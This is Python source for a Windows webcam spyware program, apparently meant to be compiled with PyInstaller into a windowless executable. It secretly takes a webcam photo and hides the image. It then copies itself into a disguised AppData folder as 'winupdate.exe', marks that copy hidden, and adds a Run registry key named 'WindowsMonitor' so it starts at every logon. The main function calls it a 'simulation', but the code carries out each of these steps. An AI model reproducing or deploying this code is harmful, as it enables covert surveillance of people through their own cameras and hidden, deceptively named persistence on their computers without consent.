# pyinstaller --noconsole --onefile hackcam.py
# dist/spycam.exe

import cv2
import os
import ctypes
import shutil
import winreg
import time

def capture_image(filename="captured.jpg"):
    """Capture a single webcam image."""
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("[!] Cannot access camera.")
        return None

    ret, frame = cam.read()
    if ret:
        cv2.imwrite(filename, frame)
        print("[+] Image captured.")
    else:
        print("[!] Failed to capture image.")
        filename = None

    cam.release()
    return filename

def hide_file(filepath):
    """Make file hidden in Windows Explorer."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(filepath, 0x02)
        print(f"[-] Hiding file: {filepath}")
    except Exception as e:
        print(f"[!] Failed to hide file: {e}")

def move_to_hidden_folder(exe_path):
    """Move self to AppData and hide."""
    target_dir = os.path.join(os.getenv("APPDATA"), "WindowsSystem")
    os.makedirs(target_dir, exist_ok=True)
    target_path = os.path.join(target_dir, "winupdate.exe")

    if not os.path.exists(target_path):
        shutil.copy(exe_path, target_path)
        hide_file(target_path)
        print(f"[+] Moved to {target_path}")
    return target_path

def add_to_startup(exe_path):
    """Add script to Windows startup via Registry."""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsMonitor", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("[+] Added to startup.")
    except Exception as e:
        print(f"[!] Failed to add to startup: {e}")

def main():
    print("[*] Running spycam simulation...")

    image = capture_image()
    if image:
        time.sleep(2)
        hide_file(image)

    # Move self to AppData and persist
    exe_path = os.path.abspath(__file__)
    if exe_path.endswith(".py"):
        print("[!] Run this as compiled .exe to persist.")
    else:
        target_exe = move_to_hidden_folder(exe_path)
        add_to_startup(target_exe)

if __name__ == "__main__":
    main()
